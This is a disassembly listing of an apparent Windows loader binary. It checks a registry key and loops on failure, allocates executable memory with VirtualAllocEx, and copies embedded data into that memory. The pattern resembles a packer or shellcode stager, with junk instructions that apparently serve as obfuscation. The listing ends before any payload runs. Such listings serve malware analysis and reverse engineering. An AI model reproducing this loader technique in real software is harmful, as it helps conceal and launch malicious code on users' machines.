0x00401000:	pushl	%ebp	; from: 0x00401745(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0xc, %esp
0x00401006:	movl	0x8(%ebp), %eax
0x00401009:	movl	%eax, -8(%ebp)
0x0040100c:	movl	0xc(%ebp), %ecx
0x0040100f:	movl	%ecx, -12(%ebp)
0x00401012:	movl	$0x22b, -4(%ebp)
0x00401019:	movl	-8(%ebp), %edx
0x0040101c:	cmpl	-12(%ebp), %edx
0x0040101f:	jae	0x0040102f	; targets: 0x00401021(MAY)
0x00401021:	movl	$0x22b, -4(%ebp)	; from: 0x0040101f(MAY)
0x00401028:	movl	-8(%ebp), %eax
0x0040102b:	jmp	0x00401039	; targets: 0x00401039(MAY)
0x00401039:	movl	%ebp, %esp	; from: 0x0040102b(MAY)
0x0040103b:	popl	%ebp
0x0040103c:	ret	; targets: 0x0040174a(MAY)

0x00401040:	pushl	%ebp	; from: 0x004016fa(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	subl	$0xc, %esp
0x00401046:	movl	$0x1e4dc, -8(%ebp)
0x0040104d:	movl	$0x3000, -12(%ebp)
0x00401054:	movl	$0x40, -4(%ebp)
0x0040105b:	movl	-4(%ebp), %eax
0x0040105e:	pushl	%eax
0x0040105f:	movl	-12(%ebp), %ecx
0x00401062:	pushl	%ecx
0x00401063:	movl	0x8(%ebp), %edx
0x00401066:	pushl	%edx
0x00401067:	pushl	$0x0
0x00401069:	pushl	$0xffffffff
0x0040106b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff0002d0(MAY)
0x00401071:	movl	%ebp, %esp
0x00401073:	popl	%ebp
0x00401074:	ret	; targets: 0x004016ff(MAY)

0x00401080:	pushl	%ebp	; from: 0x00401718(MAY)
0x00401081:	movl	%esp, %ebp
0x00401083:	popl	%ebp
0x00401084:	ret	; targets: 0x0040171d(MAY)

0x00401090:	pushl	%ebp	; from: 0x0040164b(MAY)
0x00401091:	movl	%esp, %ebp
0x00401093:	pushl	%ecx
0x00401094:	movl	$0x4, -4(%ebp)
0x0040109b:	movl	-4(%ebp), %eax
0x0040109e:	addl	$0x401aa8, %eax
0x004010a3:	movl	%eax, 0x00420b58
0x004010a8:	movl	%ebp, %esp
0x004010aa:	popl	%ebp
0x004010ab:	ret	; targets: 0x00401650(MAY)

0x004010d0:	pushl	%ebp	; from: 0x004016e5(MAY)
0x004010d1:	movl	%esp, %ebp
0x004010d3:	movl	0x8(%ebp), %eax
0x004010d6:	movl	-4(%eax), %eax
0x004010d9:	popl	%ebp
0x004010da:	ret	; targets: 0x004016ea(MAY)

0x00401340:	pushl	%ebp	; from: 0x00401771(MAY)
0x00401341:	movl	%esp, %ebp
0x00401343:	subl	$0x22c, %esp
0x00401349:	movl	$0x7c, -544(%ebp)
0x00401353:	movl	$0x0, -532(%ebp)
0x0040135d:	movl	$0x0, -552(%ebp)
0x00401367:	jmp	0x00401378	; targets: 0x00401378(MAY)
0x00401369:	movl	-552(%ebp), %eax	; from: 0x004013ba(MAY)
0x0040136f:	addl	$0x1, %eax
0x00401372:	movl	%eax, -552(%ebp)
0x00401378:	movl	-552(%ebp), %ecx	; from: 0x00401367(MAY)
0x0040137e:	cmpl	0x10(%ebp), %ecx
0x00401381:	jnl	0x004013bc	; targets: 0x004013bc(MAY), 0x00401383(MAY)
0x00401383:	movl	0xc(%ebp), %edx	; from: 0x00401381(MAY)
0x00401386:	addl	-552(%ebp), %edx
0x0040138c:	movzbl	(%edx), %eax
0x0040138f:	movl	%eax, -556(%ebp)
0x00401395:	movl	$0x7c, -544(%ebp)
0x0040139f:	movl	0x8(%ebp), %ecx
0x004013a2:	addl	-552(%ebp), %ecx
0x004013a8:	movb	-556(%ebp), %dl
0x004013ae:	movb	%dl, (%ecx)
0x004013b0:	movl	$0x33, -544(%ebp)
0x004013ba:	jmp	0x00401369	; targets: 0x00401369(MAY)
0x004013bc:	movl	%ebp, %esp	; from: 0x00401381(MAY)
0x004013be:	popl	%ebp
0x004013bf:	ret	; targets: unresolved


start:
0x004015d0:	pushl	%ebp	; from: 0x00401646(MAY)
0x004015d1:	movl	%esp, %ebp
0x004015d3:	subl	$0xc8, %esp
0x004015d9:	pushl	%ebx
0x004015da:	pushl	%esi
0x004015db:	pushl	%edi
0x004015dc:	movl	%ebp, 0x00420c6c
0x004015e2:	pusha	
0x004015e3:	movl	$0x0, -136(%ebp)
0x004015ed:	movl	$0x80000002, -156(%ebp)
0x004015f7:	movl	RegOpenKeyW@advapi32.dll, %eax
0x004015fc:	movl	%eax, -180(%ebp)
0x00401602:	movl	$0x420030, -172(%ebp)
0x0040160c:	movl	$0x43, %ecx
0x00401611:	movl	-172(%ebp), %edx
0x00401617:	movw	%cx, (%edx)
0x0040161a:	movl	$0x4c, %eax
0x0040161f:	movl	-172(%ebp), %ecx
0x00401625:	movw	%ax, 0x2(%ecx)
0x00401629:	leal	-176(%ebp), %edx
0x0040162f:	pushl	%edx
0x00401630:	movl	-172(%ebp), %eax
0x00401636:	pushl	%eax
0x00401637:	pushl	$0x80000000
0x0040163c:	call	-180(%ebp)	; targets: 0xff000440(MAY)
0x00401642:	testl	%eax, %eax
0x00401644:	je	0x0040164b	; targets: 0x0040164b(MAY), 0x00401646(MAY)
0x00401646:	call	start	; targets: 0x004015d0(MAY)	; from: 0x00401644(MAY)
0x0040164b:	call	0x00401090	; targets: 0x00401090(MAY)	; from: 0x00401644(MAY)
0x00401650:	movl	$0x64, -124(%ebp)	; from: 0x004010ab(MAY)
0x00401657:	movl	$0x28, -24(%ebp)
0x0040165e:	movl	$0x0, -136(%ebp)
0x00401668:	movl	$0x0, -80(%ebp)
0x0040166f:	movl	$0x1, -120(%ebp)
0x00401676:	movl	$0x0, -16(%ebp)
0x0040167d:	movl	$0x64, -124(%ebp)
0x00401684:	movl	$0x28, -24(%ebp)
0x0040168b:	movl	$0x0, -136(%ebp)
0x00401695:	movl	$0x0, -80(%ebp)
0x0040169c:	movl	$0x1, -120(%ebp)
0x004016a3:	movl	$0x3, -20(%ebp)
0x004016aa:	movl	$0x0, -16(%ebp)
0x004016b1:	movl	$0x64, -124(%ebp)
0x004016b8:	movl	$0x28, -24(%ebp)
0x004016bf:	movl	$0x0, -136(%ebp)
0x004016c9:	movl	$0x0, -80(%ebp)
0x004016d0:	movl	$0x1, -120(%ebp)
0x004016d7:	movl	$0x3, -20(%ebp)
0x004016de:	movl	0x00420b58, %ecx
0x004016e4:	pushl	%ecx
0x004016e5:	call	0x004010d0	; targets: 0x004010d0(MAY)
0x004016ea:	addl	$0x4, %esp	; from: 0x004010da(MAY)
0x004016ed:	movl	%eax, -140(%ebp)
0x004016f3:	movl	-140(%ebp), %edx
0x004016f9:	pushl	%edx
0x004016fa:	call	0x00401040	; targets: 0x00401040(MAY)
0x004016ff:	addl	$0x4, %esp	; from: 0x00401074(MAY)
0x00401702:	movl	%eax, -132(%ebp)
0x00401708:	movl	-140(%ebp), %eax
0x0040170e:	pushl	%eax
0x0040170f:	pushl	$0x0
0x00401711:	movl	-132(%ebp), %ecx
0x00401717:	pushl	%ecx
0x00401718:	call	0x00401080	; targets: 0x00401080(MAY)
0x0040171d:	addl	$0xc, %esp	; from: 0x00401084(MAY)
0x00401720:	movl	-140(%ebp), %edx
0x00401726:	movl	%edx, -148(%ebp)
0x0040172c:	movl	-136(%ebp), %eax
0x00401732:	cmpl	-140(%ebp), %eax
0x00401738:	jae	0x004017a8	; targets: 0x0040173a(MAY)
0x0040173a:	movl	-148(%ebp), %ecx	; from: 0x00401738(MAY)
0x00401740:	pushl	%ecx
0x00401741:	movl	-124(%ebp), %edx
0x00401744:	pushl	%edx
0x00401745:	call	0x00401000	; targets: 0x00401000(MAY)
0x0040174a:	addl	$0x8, %esp	; from: 0x0040103c(MAY)
0x0040174d:	movl	%eax, -152(%ebp)
0x00401753:	movl	-152(%ebp), %eax
0x00401759:	pushl	%eax
0x0040175a:	movl	0x00420b58, %ecx
0x00401760:	addl	-80(%ebp), %ecx
0x00401763:	pushl	%ecx
0x00401764:	movl	-132(%ebp), %edx
0x0040176a:	addl	-136(%ebp), %edx
0x00401770:	pushl	%edx
0x00401771:	call	0x00401340	; targets: 0x00401340(MAY)
